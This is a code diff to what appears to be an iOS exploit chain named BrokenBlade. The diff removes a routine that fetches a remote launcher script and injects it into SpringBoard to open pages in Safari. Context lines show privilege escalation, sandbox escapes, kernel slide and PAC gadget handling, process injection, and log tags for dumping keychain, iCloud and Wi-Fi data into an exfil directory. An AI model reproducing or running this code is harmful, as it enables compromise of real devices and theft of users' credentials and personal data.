@@ -8466,11 +8466,6 @@ const SPRINGBOARD_JS_TWEAK_PATH = "/sbcustomizer_light.js";
 const SPRINGBOARD_JS_TWEAK_LABEL = "SBCustomizer JS";
 const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/brokenblade_chain_status.log";
 const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
-const DONE_LAUNCHER_PATH = "/done_launcher.js";
-const DONE_LAUNCHER_LABEL = "Done Page Launcher";
-const DONE_LAUNCHER_REQUIRED_MARKER = "url-no-probe-20260430-2352";
-const COUNTDOWN_PAGE_NAME = "countdown.html";
-const DONE_PAGE_NAME = "done.html";
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
@@ -8492,7 +8487,7 @@ const ENABLE_DUMP_COPYOUT = false;
 let chainStatusLogReady = false;
 let chainStatusBuffer = [];
 let chainStatusLastLine = "";
-const CHAIN_STATUS_FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[DONE-LAUNCH\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
+const CHAIN_STATUS_FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
 const chainStatusOriginalLog = LOG;
 LOG = function(msg) {
 	try { chainStatusRecord(msg); } catch (_) {}
@@ -8924,89 +8919,6 @@ function terminateSafariAfterClean(remoteKillTask) {
 	} finally {
 		Native.callSymbol("free", pidBuf);
 	}
-}
-
-function repoPageUrl(pageName, queryName) {
-	let origin = (typeof globalThis.__ls_site_origin === "string" && globalThis.__ls_site_origin.length > 0) ? globalThis.__ls_site_origin : "https://zeroxjf.github.io";
-	let sitePath = (typeof globalThis.__ls_site_path === "string" && globalThis.__ls_site_path.length > 0) ? globalThis.__ls_site_path : "/BrokenBlade";
-	pageName = String(pageName || DONE_PAGE_NAME).replace(/[^A-Za-z0-9_.-]/g, "");
-	queryName = String(queryName || "ts").replace(/[^A-Za-z0-9_-]/g, "");
-	origin = origin.replace(/[\x00-\x20\x7f]/g, "").slice(0, 256);
-	sitePath = sitePath.replace(/[\x00-\x1f\x7f]/g, "").slice(0, 256);
-	if (origin.indexOf("http://") !== 0 && origin.indexOf("https://") !== 0) origin = "https://zeroxjf.github.io";
-	if (!sitePath || sitePath.charAt(0) !== "/") sitePath = "/" + sitePath;
-	sitePath = sitePath.replace(/\/+$/g, "");
-	return origin + (sitePath === "/" ? "" : sitePath) + "/" + pageName + "?" + queryName + "=" + Date.now();
-}
-
-function getDoneLauncherCode(label) {
-	let prefetched = (typeof globalThis.__done_launcher_code === "string" && globalThis.__done_launcher_code.length > 0) ? globalThis.__done_launcher_code : "";
-	if (prefetched) {
-		if (prefetched.indexOf(DONE_LAUNCHER_REQUIRED_MARKER) >= 0) {
-			LOG("[PE] " + label + " code source: prefetched (" + prefetched.length + " bytes, marker ok)");
-			return prefetched;
-		}
-		LOG("[PE] " + label + " stale prefetched launcher ignored bytes=" + prefetched.length + " missing_marker=" + DONE_LAUNCHER_REQUIRED_MARKER);
-	}
-	let fetched = fetchRemoteScript(DONE_LAUNCHER_PATH);
-	if (fetched && fetched.indexOf(DONE_LAUNCHER_REQUIRED_MARKER) >= 0) {
-		LOG("[PE] " + label + " code source: fetchRemoteScript (" + fetched.length + " bytes, marker ok)");
-		return fetched;
-	}
-	if (fetched) LOG("[PE] " + label + " fetched launcher ignored bytes=" + fetched.length + " missing_marker=" + DONE_LAUNCHER_REQUIRED_MARKER);
-	return null;
-}
-
-function launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid, pageName, queryName, label) {
-	let code = getDoneLauncherCode(label);
-	if (!code) {
-		LOG("[PE] " + label + " fetch failed");
-		return false;
-	}
-	let agentLoader = null;
-	let task = existingTask;
-	let agentPid = existingAgentPid || 0;
-	try {
-		if (!task) {
-			LOG("[PE] Creating SpringBoard agent for " + label);
-			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
-			let agentInjected = agentLoader.inject();
-			LOG("[PE] " + label + " agent inject result: " + agentInjected);
-			if (!agentInjected) return false;
-			task = agentLoader.task;
-			agentPid = task.pid();
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(task);
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
-		}
-		let url = repoPageUrl(pageName, queryName);
-		LOG("[PE] Launching " + label + ": " + url);
-		let prelude = "globalThis.__bb_done_url = " + JSON.stringify(url) + ";\n";
-		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](task, prelude + code, migFilterBypass);
-		let ok = loader.inject(agentPid);
-		LOG("[PE] " + label + " inject result: " + ok);
-		if (ok) {
-			LOG("[PE] " + label + " settle delay for SpringBoard main-thread URL dispatch");
-			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 750000n);
-		}
-		return ok;
-	} catch (e) {
-		LOG("[PE] " + label + " exception: " + String(e));
-		LOG("[PE] " + label + " stack: " + (e.stack || "no stack"));
-		return false;
-	} finally {
-		if (agentLoader) {
-			LOG("[PE] Destroying " + label + " agent loader");
-			try { agentLoader.destroy(); } catch (destroyErr) { LOG("[PE] " + label + " destroy exception: " + String(destroyErr)); }
-		}
-	}
-}
-
-function launchCountdownPageInSafari(existingTask, migFilterBypass, existingAgentPid) {
-	return launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid, COUNTDOWN_PAGE_NAME, "started", "Countdown Page Launcher");
-}
-
-function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid) {
-	return launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid, DONE_PAGE_NAME, "done", DONE_LAUNCHER_LABEL);
 }
 
 	function auditSafariOriginData() {
@@ -9838,8 +9750,7 @@ function start() { LOG("[+] PE start() called");
 	} else {
 		LOG("[PE] Safari app termination before countdown disabled");
 	}
-	LOG("[PE] Initial Safari clean complete cleanOk=" + safariCleanOk + "; launching countdown page");
-	launchCountdownPageInSafari(null, migFilterBypass, 0);
+	LOG("[PE] Initial Safari clean complete cleanOk=" + safariCleanOk + "; URL launch disabled");
 
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
 	let filzaDst = "/private/var/mobile/Media/Downloads/";
@@ -10501,7 +10412,7 @@ function start() { LOG("[+] PE start() called");
 	}
 
 	LOG("[PE] start() completed successfully");
-	launchDonePageInSafari(springBoardAgentTask, migFilterBypass, agentPid);
+	LOG("[PE] Done page launch disabled");
 	} finally {
 		if (springBoardAgentLoader) {
 			LOG("[PE] Destroying agent loader");
